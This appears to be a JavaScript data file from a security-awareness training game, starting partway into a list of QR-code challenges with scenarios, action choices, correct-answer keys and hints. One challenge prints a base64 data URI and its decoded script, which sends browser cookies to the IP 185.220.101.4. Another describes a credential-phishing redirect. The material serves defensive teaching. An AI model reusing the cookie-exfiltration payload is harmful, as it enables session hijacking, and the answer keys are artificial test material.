    fivePartExplanation: {
      whatHappened: 'A commercial parking gate presented an authentic external vendor QR code on an integrated LCD screen.',
      evidence: 'The display is an automated digital monitor inside locked hardware, and the vendor domain has an established 5-year operating history.',
      whyDangerous: 'Third-party integrations require vendor verification and least-privilege permissioning, but destroying authorized hardware is destructive vandalism.',
      correctAction: 'Verify the vendor relationship through facilities management, validate parking, and decline unnecessary background device permissions.',
      securityTip: 'When using legitimate third-party service portals, enforce principle of least privilege regarding browser location and camera permissions.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Is the QR code an adhesive sticker pasted over the screen, or generated digitally by the machine itself?',
      'Check domain reputation: Is metro-parking-validation.net a reputable operational service or a malicious drop?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-06',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'malicious',
    prompt: 'Analyze this Base64 Data URI encoded directly inside a high-density QR matrix.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'data:text/html;base64,PHNjcmlwdD5kb2N1bWVudC5sb2NhdGlvbj0iaHR0cDovLzE4NS4yMjAuMTAxLjQvY29va2llP2M9Iitkb2N1bWVudC5jb29raWU8L3NjcmlwdD4=',
      redirectChain: [
        { hop: 1, url: 'data:text/html;base64,...', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Laser-printed QR label affixed to an internal server maintenance logbook',
      visualAnomaly: 'The QR matrix has exceptionally high data density with zero conventional HTTP/HTTPS protocol headers',
      physicalInspectionNotes: 'Scanned payload is a raw data: URI. Decoding the Base64 reveals: <script>document.location="http://185.220.101.4/cookie?c="+document.cookie</script>',
      redirectInspectionNotes: 'When opened in a browser that shares session context, the script immediately exfiltrates local cookies and storage tokens to 185.220.101.4.',
      payloadReputationNotes: 'Zero network requests are made to fetch the script; it is embedded entirely within the optical code itself.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_NEUTRALIZE_DATA_URI_QUISHING', label: 'Quarantine Maintenance Logbook, Strip Label, and Configure Barcode Scanners to Block "data:" Protocol Execution', variant: 'primary' },
      { actionId: 'ACTION_SCAN_INTO_BROWSER', label: 'Scan QR into Administrative Workstation Browser to Execute Maintenance Script', variant: 'danger' },
      { actionId: 'ACTION_CONVERT_BASE64_RUN', label: 'Decode Base64 and Run in PowerShell Terminal', variant: 'warning' },
      { actionId: 'ACTION_PRINT_MORE_LABELS', label: 'Print Additional Copies of the Label for Backup Logbooks', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_NEUTRALIZE_DATA_URI_QUISHING',
    privateIndicators: [
      'data_uri_xss: self-contained JavaScript payload in QR matrix',
      'zero_network_fetch: bypasses URL reputation blocklists because no domain is queried to fetch code',
      'session_exfiltration: steals document.cookie and sends to C2 IP',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Data URI quishing prevented! Handheld barcode terminals reconfigured to reject non-HTTP protocol schemes.',
      onIncorrect: 'Session cookies stolen! Data URI executed JavaScript in the browser context, exfiltrating active SSO tokens to C2.',
    },
    fivePartExplanation: {
      whatHappened: 'The QR code directly encoded a base64 Data URI containing malicious JavaScript to steal browser cookies.',
      evidence: 'The decoded payload was "<script>document.location=\'http://185.220.101.4/cookie?c=\'+document.cookie</script>".',
      whyDangerous: 'Because the entire script is stored in the QR code itself, it requires no initial HTTP download and bypasses web reputation filters.',
      correctAction: 'Configure barcode readers and mobile scanners to refuse execution of "data:", "javascript:", or non-HTTPS protocol handlers.',
      securityTip: 'Never configure QR scanner applications to automatically open scanned links without displaying and verifying the raw URI.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Decode the Base64 string inside the payload: What does "PHNjcmlwdD5..." mean in ASCII text?',
      'Why is a data: URI more dangerous than a standard website URL?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-07',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'legitimate',
    prompt: 'Evaluate an automated emergency medical supply replenishment QR code on a clinical dispensary cabinet.',
    narrative: 'A clinical restocking station features a QR code to submit automated inventory orders for critical medical supplies.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://inventory.facility-health.internal/restock?sku=MED-EPI-02&loc=SECTOR03-CAB4',
      redirectChain: [
        { hop: 1, url: 'https://inventory.facility-health.internal/restock?...', statusCode: 200, contentType: 'application/json' },
      ],
      physicalContext: 'Polycarbonate placard riveted to the inside door of an authorized medical dispensary cabinet',
      visualAnomaly: 'Placard is secured behind a badge-access locked cabinet door; points exclusively to an internal ".internal" intranet TLD',
      physicalInspectionNotes: 'Located inside secure, badge-controlled medical area. Riveted mounting shows zero physical tampering.',
      redirectInspectionNotes: 'Endpoint is on non-routable internal enterprise DNS (.internal). Requires valid internal enterprise client certificate.',
      payloadReputationNotes: 'Enterprise resource planning (ERP) dispensary backend running on internal medical VLAN.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_SUBMIT_RESTOCK_REQUISITION', label: 'Validate Internal Enterprise CA & Dispatch Automated Supply Replenishment Request', variant: 'primary' },
      { actionId: 'ACTION_REPORT_INTERNAL_PORTAL_PHISHING', label: 'File Incident Report Claiming Internal Medical Supply Network Is an Attack Vector', variant: 'danger' },
      { actionId: 'ACTION_ROUTE_TO_PUBLIC_INTERNET', label: 'Reconfigure Intranet DNS to Forward Medical Requisitions to Public Cloud Servers', variant: 'warning' },
      { actionId: 'ACTION_REMOVE_CABINET_RIVETS', label: 'Drill Out Cabinet Rivets to Remove Restocking Placard', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_SUBMIT_RESTOCK_REQUISITION',
    privateIndicators: [
      'internal_pki_validation: authenticated via private medical VLAN mTLS',
      'badge_secured_physical_enclosure: riveted inside locked cabinet',
      'non_routable_tld: .internal domain inaccessible from public internet',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Medical requisition dispatched! Internal enterprise certificate validated, restock order sent, and emergency cabinet maintained.',
      onIncorrect: 'Critical supply delay! False-positive incident reports delayed emergency medical replenishment, risking clinical shortages.',
    },
    fivePartExplanation: {
      whatHappened: 'A medical technician scanned an authentic internal inventory replenishment QR placard located inside a secured cabinet.',
      evidence: 'The QR is riveted inside a badge-protected cabinet, uses private .internal enterprise DNS, and requires internal mTLS authentication.',
      whyDangerous: 'Reporting critical medical supply systems as attacks prevents emergency replenishment of life-saving equipment like EpiPens.',
      correctAction: 'Confirm the internal DNS zone (.internal), private network routing, and physical security boundary before authorizing the restock order.',
      securityTip: 'Internal workflows secured by internal PKI and physical access controls are standard operational components of enterprise facilities.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Look at the hostname: Is ".internal" routable on the public internet?',
      'Where is the QR physically located? Is it riveted inside a locked, badge-access medical cabinet?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-08',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'malicious',
    prompt: 'Triage this malicious QR code overlay pasted on an Emergency Automated External Defibrillator (AED) safety station.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://emergency-aed-instructions.org/c/facility-first-aid',
      redirectChain: [
        { hop: 1, url: 'https://emergency-aed-instructions.org/c/facility-first-aid', statusCode: 301 },
        { hop: 2, url: 'https://credential-login-harvest.cc/login.php?urgent=medical', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Adhesive paper label pasted over the emergency glass case of the Sector 03 medical defibrillator station',
      visualAnomaly: 'Sticker reads "EMERGENCY: Scan for Step-by-Step Video CPR Instructions Before Opening Cabinet"',
      physicalInspectionNotes: 'Attackers exploit high-stress medical panic to trick personnel into scanning in order to capture credentials.',
      redirectInspectionNotes: 'Hop 2 resolves to credential-login-harvest.cc, which prompts for corporate SSO credentials before displaying video.',
      payloadReputationNotes: 'Vile social engineering tactic preying on human panic during life-safety medical events.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_PEEL_AED_STICKER_FACILITY_AUDIT', label: 'Peel Malicious Sticker Immediately, Alert Physical Security to Audit All Safety Stations, and Sinkhole Domain', variant: 'primary' },
      { actionId: 'ACTION_ENTER_SSO_FOR_CPR_VIDEO', label: 'Log In with Corporate SSO to Access CPR Video Instructions', variant: 'danger' },
      { actionId: 'ACTION_LEAVE_STICKER_FOR_EMTS', label: 'Leave Sticker for Professional Paramedics to Inspect', variant: 'warning' },
      { actionId: 'ACTION_PUT_PASSWORD_IN_COMMENT', label: 'Write Workstation Password on the Sticker with a Sharpie', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_PEEL_AED_STICKER_FACILITY_AUDIT',
    privateIndicators: [
      'life_safety_tampering: sticker placed on emergency medical AED equipment',
      'panic_exploitation: preys on fear during medical emergencies to bypass caution',
      'phishing_harvest: credential-login-harvest.cc',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Emergency station secured! Deceptive quishing overlay removed and facility-wide audit of all safety hardware initiated.',
      onIncorrect: 'Panic exploited! Cadet entered corporate credentials during simulated emergency drill, compromising master terminal.',
    },
    fivePartExplanation: {
      whatHappened: 'An attacker placed a phishing QR code sticker on emergency defibrillator equipment to exploit panic and urgency.',
      evidence: 'The sticker claimed to offer CPR instructions but routed through a redirect to "credential-login-harvest.cc".',
      whyDangerous: 'During genuine medical emergencies, cognitive capacity is strained, making personnel susceptible to credential harvesting traps.',
      correctAction: 'Peel the sticker immediately, report physical tampering to security, and mandate physical checks on all safety stations.',
      securityTip: 'Critical life-safety equipment must have tamper-evident seals and clear physical operating instructions that never require internet logins.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Would authentic emergency first aid equipment ever require an employee to log in to view life-saving instructions?',
      'Inspect the destination of the redirect chain: credential-login-harvest.cc.',
    ],
  },

  {
    challengeId: 'ch-qr-exp-09',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'ambiguous',
    prompt: 'Investigate an enterprise URL shortener QR code printed on a facility wellness campaign poster.',
    narrative: 'A bulletin board poster promotes an upcoming employee blood drive, directing donors to scan an enterprise shortlink.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'https://go.facility-corp.com/blood-drive-2026',
      redirectChain: [
        { hop: 1, url: 'https://go.facility-corp.com/blood-drive-2026', statusCode: 302 },
        { hop: 2, url: 'https://www.redcrossblood.org/give.html/drive/facilitycorp2026', statusCode: 200, contentType: 'text/html' },
      ],
      physicalContext: 'Professionally printed cardboard poster pinned to employee breakroom bulletin board',
      visualAnomaly: 'Scanned URL uses the corporate "go.facility-corp.com" shortener, redirecting out to an external charity domain',
      physicalInspectionNotes: 'No physical stickers or paste-overs; printed directly as part of the breakroom wellness poster batch.',
      redirectInspectionNotes: 'Hop 1 hits enterprise redirector; Hop 2 terminates at the official American Red Cross website (redcrossblood.org).',
      payloadReputationNotes: 'redcrossblood.org is an established, highly reputed charitable healthcare portal.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_VERIFY_SHORTENER_DESTINATION', label: 'Inspect Enterprise Shortener Redirect, Confirm Official Red Cross Endpoint, and Proceed to Appointment Booking', variant: 'primary' },
      { actionId: 'ACTION_TEAR_DOWN_CHARITY_POSTER', label: 'Tear Down Blood Drive Poster and Ban Corporate Wellness Campaigns', variant: 'danger' },
      { actionId: 'ACTION_ENTER_WORKSTATION_PASSWORD_ON_REDCROSS', label: 'Input Corporate Workstation Password into the Red Cross Donor Registration Form', variant: 'warning' },
      { actionId: 'ACTION_FORWARD_SHORTLINK_TO_SPAM_BLOCKLIST', label: 'Add go.facility-corp.com to Enterprise Firewall Domain Blacklist', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_VERIFY_SHORTENER_DESTINATION',
    privateIndicators: [
      'enterprise_shortlink_redirection: go.facility-corp.com internal redirector',
      'reputable_charity_destination: redcrossblood.org authentic donor portal',
      'credential_protection_rule: never enter corporate credentials on external sites',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Redirection path verified! Confirmed official enterprise shortener alias resolves to authentic Red Cross portal safely.',
      onIncorrect: 'Disproportionate response or credential exposure! Tearing down approved charity posters or entering SSO passwords on external sites violates policy.',
    },
    fivePartExplanation: {
      whatHappened: 'A corporate wellness poster used an internal shortlink that redirected to the American Red Cross appointment portal.',
      evidence: 'The initial link is on the authentic corporate shortener (go.facility-corp.com) and resolves safely to redcrossblood.org.',
      whyDangerous: 'Shorteners can be abused to hide destinations, but blacklisting corporate shorteners breaks enterprise communication channels.',
      correctAction: 'Trace the redirect chain using a safe inspection tool, confirm the terminal domain is legitimate, and avoid entering corporate credentials on external sites.',
      securityTip: 'Always inspect where an internal shortlink resolves before interacting with third-party web forms.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Check the intermediate link: Does go.facility-corp.com belong to the enterprise?',
      'Check the final destination: Is redcrossblood.org an authentic nonprofit medical organization?',
    ],
  },

  {
    challengeId: 'ch-qr-exp-10',
    roomId: 'room-03-scanner',
    topic: TOPICS.QR_SECURITY,
    difficulty: 'expert',
    scenarioType: 'legitimate',
    prompt: 'Assess a conference room smart display wireless screen pairing QR code.',
    narrative: 'In Sector 03 Executive Boardroom, a 4K presentation display shows a dynamically updating QR code for local wireless screen casting.',
    sanitizedEvidence: {
      type: 'qr_scanner',
      scannedPayload: 'presentation://matrix-display-12?token=792841&room=boardroom-01&crypto=ed25519',
      redirectChain: [
        { hop: 1, url: 'presentation://matrix-display-12?...', statusCode: 200, contentType: 'application/x-presentation-cast' },
      ],
      physicalContext: 'Dynamic high-contrast digital watermark displayed in bottom corner of boardroom screen',
      visualAnomaly: 'Pairing token and QR code refresh automatically every 180 seconds; no internet routing',
      physicalInspectionNotes: 'Rendered directly by the authorized enterprise presentation appliance (Crestron / Barco ClickShare).',
      redirectInspectionNotes: 'Payload is a local mDNS / peer-to-peer pairing URI utilizing Ed25519 cryptographic handshake on the local VLAN.',
      payloadReputationNotes: 'Confined strictly to boardroom presentation VLAN; zero internet egress traffic.',
    },
    get evidence() {
      return this.sanitizedEvidence;
    },
    valuableArtifacts: ['redirect_tracer', 'physical_inspection', 'domain_reputation'],
    allowedActions: [
      { actionId: 'ACTION_PAIR_PRESENTATION_DISPLAY', label: 'Confirm Ephemeral Token on Display & Initiate Encrypted Local Screen Mirroring Session', variant: 'primary' },
      { actionId: 'ACTION_UNPLUG_BOARDROOM_DISPLAY', label: 'Unplug Presentation Display from Wall Believing the Dynamic QR Code Is a Live Worm', variant: 'danger' },
      { actionId: 'ACTION_POST_PAIRING_TOKEN_INTERNET', label: 'Post Pairing Token to Public Forum to Test External Casting Capabilities', variant: 'warning' },
      { actionId: 'ACTION_REPORT_CRESTRON_AS_MALWARE', label: 'File Critical Malware Report Against the Conference Room TV Appliance', variant: 'ghost' },
    ],
    get availableActions() {
      return this.allowedActions;
    },
    correctActionId: 'ACTION_PAIR_PRESENTATION_DISPLAY',
    privateIndicators: [
      'authorized_av_appliance: verified Crestron/Barco enterprise casting system',
      'ephemeral_ed25519_handshake: rotates pairing token every 3 minutes',
      'local_vlan_confinement: zero external internet egress or DNS queries',
    ],
    scoringMetadata: {
      basePoints: 750,
      targetTimeSeconds: 45,
    },
    consequenceData: {
      onCorrect: 'Screen pairing established! Ephemeral cryptographic token validated and secure local presentation session initiated.',
      onIncorrect: 'Executive disruption! Unplugging display hardware during a high-stakes briefing caused technical failure without improving security.',
    },
    fivePartExplanation: {
      whatHappened: 'A presenter inspected a dynamically refreshing local screen-casting QR code on a boardroom display appliance.',
      evidence: 'The code is rendered directly by the Crestron appliance, rotates every 3 minutes, and uses local Ed25519 peer-to-peer handshake.',
      whyDangerous: 'Falsely identifying standard enterprise AV casting technology as malware disrupts business operations and executive meetings.',
      correctAction: 'Verify the physical display source and local protocol scheme, match the on-screen pairing token, and establish the encrypted cast.',
      securityTip: 'Modern wireless presentation systems use dynamic QR codes with ephemeral keys to prevent unauthorized remote screen takeovers.',
    },
    get explanation() {
      return this.fivePartExplanation;
    },
    hints: [
      'Notice that the pairing token rotates every 3 minutes on the screen: Is this an attack or a built-in security feature against unauthorized casting?',
      'Does the presentation:// protocol communicate across the local presentation VLAN or query external foreign servers?',
    ],
  },
];

/**
 * Returns all challenges defined for Room 03.
 */
export function getRoom03Challenges() {
  return ROOM_03_CHALLENGES;
}

/**
 * Finds a Room 03 challenge definition by ID.
 */
export function getRoom03ChallengeById(challengeId) {
  return ROOM_03_CHALLENGES.find((c) => c.challengeId === challengeId);
}
